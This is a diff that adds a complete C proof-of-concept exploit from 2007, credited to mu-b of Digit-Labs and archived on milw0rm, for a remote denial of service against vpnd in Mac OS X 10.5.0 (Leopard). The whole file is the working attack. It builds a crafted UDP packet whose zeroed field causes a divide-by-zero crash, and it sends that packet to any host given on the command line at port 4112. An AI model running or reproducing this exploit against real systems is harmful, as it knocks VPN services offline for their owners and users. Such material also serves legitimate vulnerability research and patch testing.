@@ -1,0 +1,96 @@
+/* vpnd-leopard-lb-dos.c
+ *
+ * Copyright (c) 2007 by <mu-b@digit-labs.org>
+ *
+ * Apple MACOS X 10.5.0 (leopard) vpnd remote DoS POC
+ * by mu-b - Fri 9 Nov 2007
+ *
+ * - Tested on: Apple MACOS X 10.5.0 (leopard) vpnd
+ *
+ * Program received signal EXC_ARITHMETIC, Arithmetic exception.
+ * 0x00004828 in accept_connections ()
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/types.h>
+
+#define DEF_PORT      4112
+#define PORT_VPND     DEF_PORT
+
+static char abuf[] =
+  "\x00\x01\x00\x18"
+  "\x00\x00\x00\x00"
+  "\xd5\xa5\xf9\xc3"
+  "\x00\x00"          /* [edi+0Ch] -> ecx == 0 */
+  "\x00\x00\x00\x00"
+  "\x00\x00\x00\x00"
+  "\x00\x00";
+
+static void zattack (char *host);
+
+static void
+zattack (char *host)
+{
+  struct sockaddr_in address;
+  struct hostent *hp;
+  int fd, n;
+
+  if ((fd = socket (AF_INET, SOCK_DGRAM, 0)) == -1)
+    {
+      perror ("socket()");
+      exit (EXIT_FAILURE);
+    }
+
+  if ((hp = gethostbyname (host)) == NULL)
+    {
+      perror ("gethostbyname()");
+      exit (EXIT_FAILURE);
+    }
+
+  memset (&address, 0, sizeof (address));
+  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
+  address.sin_port = htons (PORT_VPND);
+
+  printf ("+Attacking %s:%d\n", host, PORT_VPND);
+
+  n = sendto (fd, abuf, sizeof abuf - 1, 0, (struct sockaddr *) &address, sizeof address);
+  if (n != sizeof abuf - 1)
+    {
+      fprintf (stderr, "zattack: sendto %d != %d\n", n, sizeof abuf - 1);
+      exit (EXIT_FAILURE);
+    }
+
+  close (fd);
+}
+
+int
+main (int argc, char **argv)
+{
+  printf ("Apple MACOS X 10.5.0 (leopard) vpnd remote DoS PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");
+
+  if (argc <= 1)
+    {
+      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
+      exit (EXIT_SUCCESS);
+    }
+
+  zattack (argv[1]);
+
+  printf ("+Wh00t!\n");
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2007-12-04]
